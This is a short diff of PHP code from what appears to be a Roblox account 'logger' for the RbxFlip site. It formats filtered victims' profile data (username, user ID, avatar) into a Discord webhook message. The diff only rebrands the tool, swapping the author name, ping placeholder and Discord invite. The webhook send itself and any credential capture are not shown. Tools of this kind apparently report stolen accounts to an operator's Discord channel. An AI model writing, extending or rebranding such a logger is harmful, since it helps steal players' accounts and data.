@@ -23,7 +23,7 @@
         
         if (account_filter($profile)) {
             $hookObject = json_encode([
-                "content" => "<@id>",
+                "content" => "<@ID To Ping U>",
                 "embeds" => [
                     [
                         "title" => $profile ["UserName"],
@@ -34,8 +34,8 @@
                             "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                         ],
                         "author" => [
-                             "name" => "\"Spito\" RbxFlip Logger",
-                             "url" => "https://discord.gg/bribez"
+                             "name" => "\"Toco\" RbxFlip Logger",
+                             "url" => "https://discord.gg/xss"
                         ],
                         "fields" => [
                             [
